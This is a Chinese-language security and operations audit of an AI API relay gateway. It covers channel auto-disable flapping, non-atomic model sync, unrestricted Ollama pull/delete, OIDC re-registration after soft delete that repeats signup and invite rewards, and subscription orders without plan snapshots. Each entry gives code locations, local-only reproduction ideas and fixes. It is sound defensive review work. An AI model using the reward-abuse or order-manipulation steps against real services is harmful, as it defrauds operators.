- 修复建议：把渠道测试纳入独立“运维测试预算”或 Root 预算账户，所有真实上游测试都应有成本归属、频率限制、并发限制和每日上限；测试消费日志应明确区分“真实用户消费”和“运营测试成本”，避免混入收入/用户成本统计。`SysLog` 不应输出完整测试响应体，只记录状态码、usage、body hash、响应长度、安全预览和 request id。`/api/channel/test`、`/api/channel/update_balance`、Codex refresh/usage、批量模型更新等高影响操作应增加 Root 或 step-up 权限、操作人审计、原因字段和冷却时间。自动测试应有全局成本上限、失败阈值防抖、多次连续失败才自动禁用、以及“仅健康检查低成本端点”的模式。余额查询返回值应做范围校验和异常告警，例如负数、极大值、单位疑似错误时不直接覆盖 `channels.balance`。Codex refresh 应单独记录脱敏审计事件，不把上游 usage body 原样返回或长期保存。
- 优先级：P1。
- 当前状态：未修复。

### 风险 194：渠道自动启停按单次错误或单次慢响应决策，可能误禁用健康渠道或误启用不稳定渠道

- 影响范围：生产 relay 路由、渠道自动禁用/自动启用、全渠道测试、自动渠道测试、多 key 渠道状态、渠道缓存、渠道能力表、供应商错误归因、用户请求成功率和运营成本。
- 触发条件：运营开启 `AutomaticDisableChannelEnabled`、`AutomaticEnableChannelEnabled` 或自动渠道测试；某个渠道在单次用户请求、单次渠道测试或一次短时网络抖动中返回命中禁用状态码、命中禁用关键词、`channel:` 类错误，或响应时间超过全局阈值；多 key 渠道的当前 key 被记录为失败，或测试上下文拿不到准确 `usingKey`。
- 涉及文件/函数：
  - `controller/relay.go:223-235`：普通 relay 在单次上游错误后立即调用 `processChannelError`，随后才根据 `shouldRetry` 判断是否切换重试渠道；禁用决策基于当前这一次错误对象。
  - `controller/relay.go:356-363`：`processChannelError` 只要 `service.ShouldDisableChannel(err)` 为真且渠道开启 `AutoBan`，就异步调用 `service.DisableChannel`，没有连续失败次数、失败比例、最近成功样本或 provider 级熔断窗口。
  - `service/channel.go:45-65`：`ShouldDisableChannel` 在总开关开启后，对 `channel:` 错误直接返回 true；对状态码按 `AutomaticDisableStatusCodeRanges` 判断；对错误文本用 `AutomaticDisableKeywords` 做大小写不敏感匹配。这里没有区分一次性限流、用户参数错误、供应商瞬时故障、代理超时、配置错误和密钥失效的确认流程。
  - `setting/operation_setting/status_code_ranges.go:17-55`：默认自动禁用状态码只有 `401`，这是正向证据；但后台允许把 403、429、500-599 等范围加入自动禁用规则，启用后会把这些状态码纳入单次禁用判断。
  - `web/default/src/features/system-settings/integrations/monitoring-settings-section.tsx:433-449`：前端示例提示可配置 `401, 403, 429, 500-599`，这类范围若直接用于自动禁用，会把短时限流或供应商 5xx 抖动升级成渠道状态变更。
  - `controller/channel-test.go:913-949`：全渠道/自动测试按一次 `testChannel` 的错误和一次耗时比较判断 `shouldBanChannel`；响应时间超过 `ChannelDisableThreshold` 时构造 `ErrorCodeChannelResponseTimeExceeded` 并视为应禁用。
  - `controller/channel-test.go:951-959`：测试时如果渠道原本启用且 `shouldBanChannel` 为真，就调用 `processChannelError`；如果渠道原本不是启用且 `ShouldEnableChannel(newAPIError, channel.Status)` 为真，就立即启用。
  - `service/channel.go:67-78`：`ShouldEnableChannel` 只要求自动启用开关开启、当前测试无错误、状态为 `ChannelStatusAutoDisabled`；没有连续成功次数、观察期、低流量试运行或和历史失败原因匹配的恢复确认。
  - `model/channel.go:641-690`：多 key 渠道按 `usingKey` 更新单 key 状态；如果 `usingKey` 不存在且非空，只记录系统日志并返回，状态保持不变；如果 `usingKey` 为空，则会更新整个渠道状态和 `other_info`。因此上下文缺失或 key 轮换时，可能出现该禁的 key 没禁、或把单 key 错误升级为全渠道状态变化。
  - `model/channel.go:681-689`：当多 key 的所有 key 都被标记为不可用时，整个渠道状态改为 `AutoDisabled`；但每个 key 仍可能只经历了一次失败样本。
  - `model/channel.go:706-779` 与 `model/channel_cache.go:226-249`：内存缓存开启时，`UpdateChannelStatus` 会先修改缓存或从路由列表移除渠道，再读取数据库并保存；如果后续 `SaveWithoutKey` 失败，函数返回 false，但缓存中的运行态已经可能提前变化，直到下一次缓存同步才有机会被数据库状态覆盖。
  - `model/option.go:564-565`：后端解析 `ChannelDisableThreshold` 忽略 `ParseFloat` 错误；前端有非负数字校验是正向证据，但后端缺少同等兜底，配置来源绕过前端时可能把阈值写成异常值，放大自动测试误判。
  - `common/constants.go:152-154`：默认 `ChannelDisableThreshold = 5.0`，自动禁用和自动启用默认关闭；本风险依赖运营开启相关自动化后触发。
- 可能后果：健康渠道可能因为一次供应商 5xx、瞬时网络慢、429 限流、代理抖动或错误文本误命中关键词被自动移出生产路由，导致用户请求集中到剩余渠道，进一步放大成本、限流和失败率。相反，已自动禁用的渠道只要一次测试成功就会被重新启用，可能在问题尚未恢复时重新承接真实流量，形成“禁用-启用-再失败”的抖动。多 key 渠道中，单个 key 的一次失败可能逐步把所有 key 都标记为禁用；而 `usingKey` 丢失或 key 列表变化时，又可能无法准确定位失败 key，造成状态滞后或误伤整条渠道。缓存先改、数据库后保存还会让运行时路由和持久化状态短时间不一致，运维后台看到的状态与真实调度状态可能不同。
- 复现思路：在本地环境开启自动禁用和自动测试，配置一个测试渠道让上游第一次返回 500 或人为延迟超过 `ChannelDisableThreshold`，观察一次测试是否会把渠道改为自动禁用；再让同一渠道下一次返回 200，观察自动启用是否只需一次成功。对多 key 渠道分别模拟 `usingKey` 命中、`usingKey` 为空、`usingKey` 不在当前 key 列表三种情况，检查 `MultiKeyStatusList`、`channels.status`、`other_info.status_reason` 和缓存路由列表变化。复现只使用本地假上游或 mock 服务，不对真实付费渠道制造错误或高频测试。
- 修复建议：把自动禁用从“单次错误触发”改为带窗口的健康评分：按渠道、模型、endpoint、key 维度统计连续失败次数、失败率、最近成功时间和错误类别；对 401/403 等强认证错误可快速禁用，但对 429、5xx、超时和响应慢应要求多次确认或降权而不是立即禁用。自动启用应要求连续成功、观察期和低流量试运行，并校验恢复原因与禁用原因一致。响应时间阈值应支持按渠道类型、模型和 endpoint 配置，并使用 P95/P99 或多样本中位数，而不是单次耗时。多 key 状态更新应在 `usingKey` 缺失时保守处理：记录待确认错误，不直接全渠道禁用；key 不存在时应产生可见告警并触发 key 列表刷新。`UpdateChannelStatus` 应先完成数据库事务，再更新内存缓存和能力路由；或者在 DB 保存失败时回滚缓存。后端应对 `ChannelDisableThreshold` 做非负、有限数字、合理上限校验，并拒绝 NaN、负数和解析失败值。
- 优先级：P1。
- 当前状态：未修复。

### 风险 196：上游模型自动同步会直接改变可路由模型面，且模型字段与能力表重建不是原子操作

- 影响范围：渠道 `models` 字段、`abilities` 路由能力表、内存渠道缓存、模型列表展示、用户可请求模型范围、模型价格/倍率配置、上游模型巡检通知、Admin 批量应用模型变更、自动新增模型同步。
- 触发条件：某个渠道开启 `upstream_model_update_check_enabled`，并进一步开启 `upstream_model_update_auto_sync_enabled`；或 Admin 调用单渠道/全量 detect 后再调用 apply/apply_all；上游 `/models` 返回新增模型、删除模型、临时异常空列表、供应商实验模型或高成本模型；保存 `channels.models/settings` 成功但后续 `UpdateAbilities` 失败，或内存缓存刷新失败/未执行。
- 涉及文件/函数：
  - `router/api-router.go:233-274`：上游模型检测、应用和批量应用都位于 AdminAuth 的 channel route 下，`/upstream_updates/apply_all`、`/detect_all` 未额外要求 RootAuth、二次验证或变更原因。
  - `dto/channel_settings.go:38-43`：渠道设置支持检测开关、自动同步开关、上次检测新增/删除模型和忽略模型列表；这些字段直接存入渠道 `settings` JSON。
  - `web/default/src/features/channels/components/drawers/channel-mutate-drawer.tsx:3230-3311`：前端提供“周期性检测”和“自动同步上游模型”开关，并支持 `regex:` 忽略规则；这是便利功能，但也让一个渠道配置变化可以持续影响生产模型面。
  - `controller/channel_upstream_update.go:237-248`：检测逻辑先拉取上游模型，再与本地 `channel.GetModels()`、忽略列表和 model mapping 对比，生成待新增/待删除列表。
  - `controller/channel_upstream_update.go:262-346`：OpenAI 兼容、Ali、Zhipu、VolcEngine、Moonshot、Gemini、Ollama 等路径会从上游模型列表提取 ID；这里不会校验新增模型是否已有本地价格、模型元数据、供应商所有者、模型类型、端点类型或运营批准。
  - `controller/channel_upstream_update.go:360-406`：自动任务在 `allowAutoApply && UpstreamModelUpdateAutoSyncEnabled && len(pendingAddModels) > 0` 时会把所有待新增模型 merge 进 `channel.Models` 并落库；自动任务不会自动删除模型，这是正向证据，但新增模型会直接进入渠道配置。
  - `controller/channel_upstream_update.go:398-404`：`updateChannelUpstreamModelSettings` 先保存 `settings` 和可选的 `models`，然后才调用 `channel.UpdateAbilities(nil)`；如果能力表重建失败，函数返回错误，但已经保存的 `channels.models/settings` 不会回滚。
  - `controller/channel_upstream_update.go:705-724` 与 `controller/channel_upstream_update.go:780-827`：手动单渠道应用同样先更新 `channels.models/settings`，再更新 abilities；能力重建失败时接口会返回错误，但本地模型字段可能已经变化。
  - `controller/channel_upstream_update.go:847-925`：批量应用会遍历所有 enabled 且开启检测的渠道，把待新增和待删除都应用；失败渠道只进入 `failed_channel_ids`，已成功和部分落库的渠道不会整体回滚。
  - `model/ability.go:193-260`：`UpdateAbilities` 自身会在独立事务里删除并重建单渠道 abilities；这能保护 abilities 表内部一致性，但不能回滚前面已经写入的 `channels.models/settings`。
  - `model/channel_cache.go:22-86`：内存缓存重建按 `channels.models` 构建 `group2model2channels`，而非按 abilities 表构建模型列表；因此在 MemoryCache 开启时，缓存刷新后可能按新 `channels.models` 路由，而 DB abilities 仍停留在旧状态或反之。
  - `model/ability.go:41-52` 与 `model/ability.go:106-143`：非内存缓存路径和模型列表查询依赖 enabled abilities；这会放大 `channels.models`、abilities、内存缓存三者不一致带来的前后端差异。
  - `setting/ratio_setting/model_ratio.go:372-421` 与 `relay/helper/price.go:67-104`：未知模型默认不是静默免费；未配置价格/倍率且未允许未配置模型时会 fail closed。但如果自用模式或用户设置允许未配置模型，未知模型会走默认倍率 37.5；如果已有通配/同名价格，则会直接可计费调用。
- 可能后果：供应商上线实验模型、区域模型、`-preview`、图像/音频/推理高价模型或内部模型时，自动同步会把它们加入生产渠道模型面。若站点已有价格/倍率或允许未配置模型，用户可能在运营未评估成本、内容类型、模型限制和安全策略前直接请求；若没有价格，用户会看到模型列表/路由面变化但实际调用失败，形成“模型显示可用但无法使用”的客服问题。手动批量应用删除模型时，如果 Admin 未逐项确认，可能把上游临时缺失的模型从渠道移除，导致用户请求突然无渠道可用。更隐蔽的是，`channels.models/settings` 已保存但 `UpdateAbilities` 失败时，接口可能报错，运营以为没有生效；实际 DB 字段已经变化，内存缓存和能力表可能分叉，造成模型列表、渠道选择、后台展示和真实 relay 行为不一致。
- 复现思路：本地用假 OpenAI 兼容上游返回模型列表 `["known-model","new-expensive-preview"]`，给测试渠道开启检测和自动同步，运行检测任务或调用 detect/apply，观察 `channels.models` 是否加入新模型、`abilities` 是否随之变化、模型列表是否展示。再在 `UpdateAbilities` 插入阶段注入 DB 错误，观察接口返回失败时 `channels.models/settings` 是否已经保存。对批量应用，先让上游临时返回空或缺少某模型，检测后调用 apply_all，观察是否会批量删除待删除模型。只使用本地假上游和测试渠道，不对真实生产供应商执行批量应用。
- 修复建议：把模型自动同步拆成“检测、待审、发布”三阶段。自动任务最多写入待审列表和通知，不应默认把新增模型直接加入 `models`；若保留自动新增，应要求本地已存在价格/倍率、模型元数据、端点类型匹配、供应商 allowlist、成本上限和分组策略检查。删除模型必须要求连续多次缺失或供应商明确 deprecated 标记，不能基于一次 `/models` 差异批量删除。`channels.models/settings` 与 abilities 重建应放进同一数据库事务，更新成功后再刷新缓存；任何一步失败都应回滚并返回明确状态。批量应用应提供 dry-run diff、Root/step-up 确认、变更原因、逐渠道审计日志和可回滚快照。内存缓存应统一从同一权威源构建，或在刷新前校验 `channels.models` 派生 abilities 与实际 abilities 一致。
- 优先级：P1。
- 当前状态：未修复。

### 风险 197：Ollama pull/delete 只需 AdminAuth 且缺少服务端队列、取消和资源配额，可能长时间占用磁盘/网络或误删本地模型

- 影响范围：Ollama 本地模型仓库、Ollama 服务磁盘空间、网络带宽、CPU/GPU 资源、Admin 后台可用性、Ollama 渠道模型列表、正在使用该本地模型的用户请求、部署型 Ollama 容器和共享 Ollama 服务。
- 触发条件：Admin 打开 Ollama 模型管理，对任意 `model_name` 调用 `/api/channel/ollama/pull` 或 `/api/channel/ollama/pull/stream`，或删除本地模型；管理员误输入超大模型、重复点击多个下载、浏览器中途关闭、后台会话被盗、内部脚本批量调用；Ollama baseURL 指向共享服务、部署容器或内网 Ollama。
- 涉及文件/函数：
  - `router/api-router.go:263-266`：Ollama pull、pull stream、delete、version 都挂在 AdminAuth channel route 下，没有 RootAuth、`SecureVerificationRequired`、`CriticalRateLimit` 或专门的资源操作权限。
  - `controller/channel.go:1721-1781`：非流式 pull 只校验 `channel_id` 和 `model_name` 非空、渠道类型为 Ollama，然后同步调用 `ollama.PullOllamaModel`；没有模型名 allowlist、大小预估、并发锁、操作原因、审计记录或后台任务 ID。
  - `controller/channel.go:1784-1864`：流式 pull 直接把 SSE 进度写回客户端，随后同步等待 `ollama.PullOllamaModelStream` 返回；没有持久任务、取消接口、服务端队列或每渠道/每用户并发限制。
  - `controller/channel.go:1831-1835`：SSE 响应设置了 `Access-Control-Allow-Origin: *`；虽然路由仍要求 Admin cookie/鉴权，但作为后台高危长连接操作，不应额外放宽跨域语义。
  - `controller/channel.go:1840-1847`：进度回调只向当前 `c.Writer` 写事件；调用 Ollama 的请求没有绑定 `c.Request.Context()`。前端断开、关闭弹窗或 AbortController 取消浏览器请求，并不会自动取消后端到 Ollama 的下载。
  - `relay/channel/ollama/relay-ollama.go:321-358`：非流式 pull 使用 `http.Client{Timeout: 30 * 60 * 1000 * time.Millisecond}`，即最长 30 分钟；请求只传 `modelName`，不做大小、来源、tag 或 digest 校验。
  - `relay/channel/ollama/relay-ollama.go:362-435`：流式 pull 使用最长 1 小时超时，逐行读取 Ollama 进度；`scanner` 使用默认 token 限制，异常长进度行会失败，但更主要的问题是整个下载期间占用后端 handler 和 Ollama 资源。
  - `controller/channel.go:1866-1927` 与 `relay/channel/ollama/relay-ollama.go:439-473`：delete 同样只要求 AdminAuth 和模型名；底层 `DeleteOllamaModel` 使用裸 `http.Client{}`，没有超时，也没有确认该模型是否仍在 `channels.models` 中被生产流量使用。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:233-341`：前端 pull 使用 AbortController 并展示进度，这是正向体验；但 abort 只取消浏览器到 NewAPI 的连接，后端没有把该 context 传给 Ollama。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:576-610`：前端删除有独立确认弹窗，这是正向证据；但后端没有同等的二次安全验证、原因字段和审计。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:489-503`：前端还允许把本地模型 append 或 replace 到 channel models list；如果模型刚被删除或下载失败，渠道模型配置与本地实际可用模型可能不一致。
- 可能后果：一个普通 Admin 会话就可以让后端 Ollama 服务下载任意模型名对应的大模型，长时间占用带宽和磁盘，甚至把部署容器或宿主机磁盘打满；重复请求可能并发拉取多个大模型，影响同机数据库、日志、缓存和模型推理服务。浏览器断开后，后端仍可能继续等待 Ollama 下载直到超时或成功，运营以为已经取消，实际资源仍在消耗。delete 路径可能删除正在生产使用的本地模型，导致后续用户请求失败、自动重试、渠道误禁用或客服投诉。由于缺少操作审计和任务记录，事故后难以判断谁在何时下载/删除了哪个模型、下载是否完成、占用了多少资源。
- 复现思路：本地配置一个 Ollama 测试渠道，调用 `/api/channel/ollama/pull/stream` 拉取一个很大的模型名，然后关闭浏览器或中断客户端连接，观察后端到 Ollama 的请求是否继续、Ollama 是否继续下载。并发触发多个不同模型 pull，观察后端 handler、Ollama 进程、磁盘和网络占用。对 delete，先把某个本地模型加入渠道 `models`，再调用 `/api/channel/ollama/delete` 删除它，观察渠道列表/能力表是否仍显示该模型但实际请求失败。只在本地测试 Ollama 或隔离容器中复现，不对共享生产 Ollama 执行大模型下载或删除。
- 修复建议：Ollama 模型管理应提升为高危资源操作：要求 Root 或独立权限、`SecureVerificationRequired`、`CriticalRateLimit`、原因字段和结构化审计。pull 应进入持久任务队列，按渠道/Ollama baseURL 串行或限并发执行，记录任务 ID、操作者、模型名、开始/结束时间、进度、下载大小、失败原因，并支持服务端取消。后端请求必须使用 `http.NewRequestWithContext(c.Request.Context())` 或任务 context，前端 abort/取消接口应能真正取消上游 pull。新增模型名前应校验 allowlist、tag 格式、最大预计大小、可用磁盘空间和来源 registry；删除前检查是否仍被任何 channel models 使用，要求二次确认并可选择先从渠道模型列表移除/禁用。delete 和 version 请求也应设置超时。前端确认只能作为体验，后端必须执行同等安全策略。
- 优先级：P1。
- 当前状态：未修复。

### 风险 198：Ollama 本地模型仓库与 `channels.models`/abilities 缺少双向同步，可能把已删除或未拉取完成的模型继续暴露给用户

- 影响范围：Ollama 渠道 `models` 字段、`abilities` 路由能力表、内存渠道缓存、用户可见模型列表、Ollama 本地模型仓库、渠道自动禁用、错误日志、客服与运营排障。
- 触发条件：Admin 在 Ollama 模型管理中拉取模型后未手动 append/replace 到渠道模型；拉取失败或中途断开但运营误以为模型已可用；Admin 删除某个已经写入 `channels.models` 的本地模型；多个 Admin 同时在同一渠道执行 pull/delete/apply selection；Ollama 实例被外部运维手工删除模型或更换数据卷；上游模型拉取只刷新前端列表但未发布到渠道能力表。
- 涉及文件/函数：
  - `router/api-router.go:263-266`：Ollama pull、pull stream、delete 和 version 是独立管理接口；它们没有声明或执行与渠道 `models`/abilities 的同步事务。
  - `controller/channel.go:1721-1781`：`OllamaPullModel` 成功后只返回 `Model ... pulled successfully`，不会把 `req.ModelName` 写入 `channel.Models`，也不会调用 `UpdateAbilities` 或 `InitChannelCache`。
  - `controller/channel.go:1784-1864`：`OllamaPullModelStream` 成功后同样只发送 SSE success 和 `[DONE]`，不会自动发布模型到渠道配置；前端断开后后端仍可能继续执行，进一步放大“用户看到的状态”和“后台真实执行状态”的差异。
  - `controller/channel.go:1866-1927`：`OllamaDeleteModel` 删除本地模型后只返回成功，不检查该模型是否仍存在于任何渠道的 `models` 字段，也不会从当前渠道或其他同 baseURL 渠道移除对应 ability。
  - `relay/channel/ollama/relay-ollama.go:281-318`：`FetchOllamaModels` 只读取 `/api/tags` 的本地模型列表；它是查询视角，不会对 NewAPI 的渠道模型字段做 reconcile。
  - `relay/channel/ollama/relay-ollama.go:321-435` 与 `relay/channel/ollama/relay-ollama.go:439-473`：pull/delete 只操作 Ollama API，本身不知道 NewAPI 的渠道模型列表和能力表状态。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:125-183`：前端打开弹窗后优先从 Ollama live tags 获取本地模型列表，失败才 fallback 到已保存渠道上游模型；这会把“本地存在”与“已发布到渠道”混在同一管理界面中展示。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:202-222`：只有点击 append/replace 才会调用 `updateChannel(currentRow.id, { models: next.join(',') })`，发布行为依赖 Admin 手工选择。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:233-341`：pull 成功后只 `fetchOllamaModels()` 和刷新 channel query，不会自动 append 新模型；如果运营以为“下载成功等于已上架”，用户仍不会看到该模型。
  - `web/default/src/features/channels/components/dialogs/ollama-models-dialog.tsx:344-367`：delete 成功后只刷新本地模型列表和 channel query，不会自动从 `channels.models` 删除该模型；如果该模型此前已发布，用户仍可能继续请求。
  - `model/channel.go:526-572`：只有渠道更新路径会保存 `channels.models` 并重建 abilities；Ollama pull/delete 不走该路径。
  - `model/ability.go:193-260`：abilities 完全按 `channel.Models` 和 `channel.Group` 重建，不校验 Ollama 本地 `/api/tags` 是否真的存在该模型。
  - `model/channel_cache.go:22-86`：内存缓存按 enabled 渠道的 `channels.models` 构建 `group2model2channels`，同样不校验 Ollama 本地仓库；缓存刷新后仍会把已删除模型路由到该渠道。
  - `relay/channel/ollama/adaptor.go:55-57`：用户请求最终会按请求类型发到 Ollama `/api/generate` 或 `/api/chat`；如果模型已不存在，错误发生在真实 relay 阶段，而不是路由前的能力筛选阶段。
  - `service/channel.go:45-62` 与 `controller/relay.go:355-364`：Ollama 返回的模型不存在、404/500 或关键字错误可能进入普通渠道错误处理；在自动禁用配置命中时，一个模型仓库不一致问题可能演变成渠道被自动禁用。
- 可能后果：拉取成功但未 append/replace 时，模型实际已经占用磁盘，却没有进入用户可见模型面，运营可能重复拉取或误判“模型不可见”为拉取失败。删除已发布模型时，`channels.models`、abilities 和内存缓存仍然认为该模型可用，用户请求会继续被路由到 Ollama，直到上游返回 model not found 或类似错误；这会产生用户请求失败、自动重试、错误日志增加、渠道被自动禁用、其他仍可用模型也被同一渠道下线等连锁影响。如果多个渠道指向同一个 Ollama baseURL，删除一个本地模型会影响所有引用它的渠道，但当前接口只按单个 `channel_id` 发起删除，没有全局引用检查。该问题不直接导致用户充值或扣费入账异常，但会影响模型售卖面、渠道稳定性和运营对“已下载/已上架/已下架”的判断。
- 复现思路：本地创建 Ollama 测试渠道，先通过 pull stream 拉取一个小模型，确认接口成功后不点击 append/replace，观察 `channels.models` 和 abilities 是否仍无该模型；再手动 append 该模型并确认用户可请求后，调用 `/api/channel/ollama/delete` 删除模型，观察 `channels.models`、abilities、内存缓存和用户模型列表是否仍保留该模型，随后发起用户请求确认错误是否只在 relay 阶段暴露。再把两个渠道配置到同一 Ollama baseURL、同一模型，删除其中一个渠道管理界面里的模型，检查另一个渠道是否也被隐式破坏。只使用本地 Ollama 或隔离容器，不删除生产共享模型。
- 修复建议：把 Ollama 本地模型状态和 NewAPI 发布状态拆成两个明确字段/视图：`local_tags` 表示已下载，`published_models` 表示已进入渠道能力。pull 成功后可以给出“发布到当前渠道”的独立确认，但不应静默上架；如果选择自动上架，必须与 `channels.models`、abilities、缓存刷新放进同一个事务化发布流程，并记录审计。delete 前必须做全局引用检查：当前模型是否存在于任何 enabled/disabled 渠道的 `models` 中、是否有活跃任务、是否仍有分组售卖；默认应阻止删除或要求先下架/禁用引用。删除成功后若运营选择同步下架，应批量更新相关渠道、重建 abilities、刷新缓存，并记录变更前快照以便回滚。模型列表 UI 应清楚区分“本地存在但未发布”“已发布但本地缺失”“正在拉取”“删除中/待下架”，并在路由前或健康检查中标记已发布但本地缺失的 Ollama 模型，避免把单模型缺失误处理成整渠道故障。
- 优先级：P1。
- 当前状态：未修复。

### 风险 201：内置 OIDC 身份占用检查不含软删除用户，注销后可重新注册新账号并重复获得新用户/邀请奖励

- 影响范围：内置 OIDC 登录注册、自助软删除账号、`QuotaForNewUser` 新用户赠额、邀请注册奖励、邀请码消耗、邮箱/用户名归属、客服账号恢复、同一企业 OIDC 身份的资产连续性。
- 触发条件：站点启用内置 OIDC 登录且 `RegisterEnabled=true`；用户通过 `DELETE /api/user/self` 或管理员 manage delete 软删除账号；OIDC provider 返回同一 `OpenID`，但 `PreferredUsername` 为空或变化，或旧 username 不再阻止新 username 创建；用户再次走 OIDC 登录注册；站点配置了新用户赠额、邀请人/被邀请人奖励或 invite-only 注册。
- 涉及文件/函数：
  - `model/user.go:826-828`：`IsOidcIdAlreadyTaken` 使用普通 `DB.Where("oidc_id = ?", oidcId).Find(&User{})`，没有 `Unscoped()`；软删除用户的 `oidc_id` 不会被视为已占用。
  - `controller/oidc.go:132-144`：OIDC 登录只在 `IsOidcIdAlreadyTaken` 返回 true 时按既有用户登录；软删除 OIDC 用户会落入“未绑定/未注册”分支。
  - `controller/oidc.go:145-164`：未找到既有 OIDC 用户且允许注册时，直接使用 OIDC 返回的 email、preferred username 或 `oidc_<max_id+1>` 创建新用户。
  - `controller/invite.go:54-71`：OIDC 注册通过 `createUserWithRegistrationInviteCode`，在事务中创建用户和消费邀请码，事务后调用 `FinalizeOAuthUserCreation`。
  - `model/user.go:563-587`：`InsertWithTx` 会给新用户设置 `QuotaForNewUser` 和新的 `AffCode`。
  - `model/user.go:591-617`：`FinalizeOAuthUserCreation` 会记录新用户赠额，并在合规确认后发放被邀请人额度和邀请人奖励。
  - `controller/user.go:819-835` 与 `model/user.go:439-445`、`model/user.go:698-707`：自助删除是软删除，并不会清空旧用户的 `oidc_id/email/inviter_id` 等字段。
  - 对比证据：`model/user.go:818-823`、`model/user.go:830-831`、`model/user.go:814-815`、`model/user.go:1176-1182` 中 GitHub/Discord/Telegram/WeChat/LinuxDO 的已占用检查使用 `Unscoped()`，软删除身份会被识别为“已占用/已注销”。
  - 对比证据：`controller/github.go:114-132` 会在 `IsGitHubIdAlreadyTaken` 命中但 scoped `FillUserByGitHubId` 找不到时返回“用户已注销”；OIDC 分支缺少同等处理。
- 可能后果：同一 OIDC 主体在软删除后可以被当成新用户重新创建。若 OIDC provider 不返回稳定 `PreferredUsername`，代码会生成新的 `oidc_<id>` username，绕开 `users.username` 唯一索引；email 不是唯一索引，旧软删用户的 email 也不会阻止新账号。用户可通过“注销账号 -> OIDC 重新注册”重复获得新用户赠额，或在 invite-only/邀请奖励开启时反复消耗可用邀请码并触发邀请奖励，造成小额薅羊毛和邀请统计污染。即使没有赠额，也会让同一企业身份对应多个历史 user_id，订单、日志、订阅、OAuth 归属和客服恢复难以连续追踪。
- 复现思路：本地启用 OIDC 和注册，配置测试 OIDC provider 返回固定 `OpenID`、空 `PreferredUsername`、固定 email。第一次 OIDC 登录注册后记录 user_id、quota、aff_code；调用 `DELETE /api/user/self` 软删除；再次用同一 OIDC 身份登录。观察是否创建新的 `oidc_<max_id+1>` 用户、是否再次获得 `QuotaForNewUser`，在带邀请码场景下是否再次消费邀请码并发放奖励。只使用本地 OIDC/mock provider，不触碰真实企业 IdP。
- 修复建议：`IsOidcIdAlreadyTaken` 改为 `DB.Unscoped()` 且使用 `Count > 0`，与其他内置 OAuth 保持一致；当软删除用户命中时返回明确“账号已注销/请联系管理员恢复”，不要创建新用户。为所有第三方身份字段建立统一的 identity table 或至少唯一索引策略，包含 provider、provider_user_id、user_id、deleted_at、status，并明确软删除后的复用规则。注册赠额和邀请奖励应绑定“自然人/第三方身份”级别的幂等记录，例如 `provider + provider_user_id + reward_type`，避免同一外部身份重复领取。历史数据迁移应扫描重复 `oidc_id`、同 email 多账号和软删 OIDC 用户，给出合并/恢复/禁止复用建议。
- 优先级：P1。
- 当前状态：未修复。

### 风险 202：订阅 pending 订单只保存 plan_id 和金额，支付完成时按当前套餐配置发放权益，套餐编辑可改变已下单未完成订单的额度、时长和升级组

- 影响范围：Stripe/Creem/Epay/Waffo Pancake 订阅购买、pending 订阅订单、套餐总额度、套餐时长、升级分组、重置周期、订阅 topup 镜像、客服对账和历史权益解释。
- 触发条件：用户创建订阅支付订单后尚未完成支付；管理员在支付回调前修改该 `SubscriptionPlan` 的 `total_amount`、`duration_unit/value/custom_seconds`、`upgrade_group`、`quota_reset_period` 或将套餐禁用；随后支付成功回调到达并调用 `CompleteSubscriptionOrder`。另一个触发面是已创建订阅后管理员修改套餐重置周期，后续维护任务或预扣路径按当前套餐重新计算重置行为。
- 涉及文件/函数：
  - `model/subscription.go:202-217`：`SubscriptionOrder` 只保存 `PlanId`、`Money`、`TradeNo`、支付方式和 provider payload，没有保存套餐标题、购买时总额度、时长、升级组、重置周期或第三方 Price/Product ID 的权益快照。
  - `controller/subscription_payment_stripe.go:81-90`、`controller/subscription_payment_epay.go:79-88`、`controller/subscription_payment_creem.go:80-89`、`controller/subscription_payment_waffo_pancake.go:74-83`：各订阅下单入口都把 `PlanId` 和 `plan.PriceAmount` 写入 pending 订单，但没有把 `plan.TotalAmount/Duration/UpgradeGroup/QuotaResetPeriod` 复制到订单。
  - `controller/subscription.go:192-301`：管理员更新套餐时可修改价格、时长、购买限制、第三方产品 ID、`total_amount`、`upgrade_group`、`quota_reset_period` 等字段；保存后只失效套餐缓存，没有处理 pending 订单或已有订阅快照。
  - `controller/subscription.go:308-327`：管理员禁用套餐只改 `enabled` 并失效缓存；pending 订单完成时不会因为套餐已禁用而拒绝。
  - `model/subscription.go:612-684`：`CompleteSubscriptionOrder` 锁定订单后重新调用 `GetSubscriptionPlanById(order.PlanId)`，并用当前 `plan` 创建用户订阅；`if !plan.Enabled {}` 只是注释保留，不阻止完成。
  - `model/subscription.go:547-606`：`CreateUserSubscriptionFromPlanTx` 按传入的当前计划计算 `EndTime`、`AmountTotal`、`NextResetTime`、`UpgradeGroup` 和 `PrevUserGroup`，因此 pending 订单完成时拿到的是回调时配置，不是下单时配置。
  - `model/subscription.go:1037-1071` 与 `model/subscription.go:1220-1238`：订阅重置逻辑会按当前 `SubscriptionPlan.QuotaResetPeriod/QuotaResetCustomSeconds` 计算下一次重置；已创建 `UserSubscription` 没有保存自己的重置周期快照。
  - `model/subscription.go:1073-1175`：订阅预扣路径在消费前也会读取当前计划并调用 `maybeResetUserSubscriptionWithPlanTx`，因此套餐重置策略编辑可能在用户请求时即时影响旧订阅。
- 可能后果：用户可以在低价或旧价格订单创建后，因管理员后续把套餐额度调高、时长调长、升级组调高或 `total_amount` 改为 0，被支付成功回调发放更高权益；也可能在用户已支付但回调延迟期间，管理员把套餐额度调低或升级组清空，导致用户到账权益低于下单展示。对已有订阅，修改重置周期会改变历史订阅的后续重置行为；把周期改成更频繁可能额外恢复额度，把周期改成 never 或无效组合则可能让用户不再按购买时规则重置。客服只能看到订单金额和当前套餐，难以解释用户实际购买时承诺的权益。
- 复现思路：本地创建套餐 A，价格 1，`total_amount=1000`，时长 1 天；通过任一订阅下单接口生成 pending `SubscriptionOrder`，不要触发回调；管理员把套餐 A 改为 `total_amount=0` 或更高额度、时长更长、`upgrade_group=vip`；再调用对应支付成功处理或直接调用 `CompleteSubscriptionOrder(tradeNo, ...)`。观察创建的 `user_subscriptions.amount_total/end_time/upgrade_group` 是否使用修改后的套餐。再创建 active 订阅后修改 `quota_reset_period`，触发 `ResetDueSubscriptions` 或一次订阅预扣，观察旧订阅重置行为是否按新计划变化。
